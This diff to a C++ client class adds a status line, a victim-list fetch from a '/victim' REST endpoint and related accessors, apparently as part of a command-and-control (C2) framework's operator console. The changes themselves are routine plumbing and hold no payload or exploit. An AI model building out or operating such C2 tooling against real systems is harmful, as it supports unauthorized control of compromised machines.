@@ -20,7 +20,8 @@ Client::Client(const std::string& db_path) :
     m_cmd_man( CommandManager::instance() ),
     m_vic_man( VictimManager::instance() ),
     m_sess_man( SessionManager::instance() ),
-    m_rest_client("")
+    m_rest_client(""),
+    m_status_text("")
 {
 
 }
@@ -69,6 +70,7 @@ std::string Client::getServerUrl() const noexcept {
 //-------------------------------------------------
 void Client::setUsername(const std::string& username) noexcept {
     m_config.set(Key::client_username_key, username);
+    updateStatusText();
 }
 
 //-------------------------------------------------
@@ -94,6 +96,7 @@ void Client::setServerUrl(const std::string& server_url) noexcept {
         m_rest_client = cpppwn::RESTClient(server_url, conf);
     }
     m_config.set(Key::client_server_url_key, server_url);
+    updateStatusText();
 }
 
 //-------------------------------------------------
@@ -113,7 +116,7 @@ std::string Client::getOutputPath() const noexcept {
 //-------------------------------------------------
 //
 //-------------------------------------------------
-bool Client::login() {
+bool Client::login() noexcept {
     m_rest_client.set_auth_basic(getUsername(), getPassword());
 
     // make test request
@@ -123,4 +126,46 @@ bool Client::login() {
         std::println("Login Failed: {}", err.what());
         return false;
     }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+const char* Client::getStatusText() const noexcept {
+    return m_status_text.c_str();
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+void Client::updateStatusText() noexcept {
+    m_status_text = std::format("User: [{}] | C2 Server: [{}] | Connections: [{}]", getUsername(), getServerUrl(), victim_count);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+bool Client::fetchVictims() noexcept {
+    m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    // make request
+    try{
+        auto victim_list = m_rest_client.list<Victim>("/victim");
+        victim_count = victim_list.size();
+        m_vic_man.setList(std::move(victim_list));
+        updateStatusText();
+        return true;
+    } catch(const std::runtime_error& err) {
+        std::println("Fetching Victims Failed: {}", err.what());
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+const std::vector<Victim>& Client::getVictims() const noexcept {
+    const auto& vics = m_vic_man.getVictims();
+    victim_count = vics.size();
+    return vics;
 }
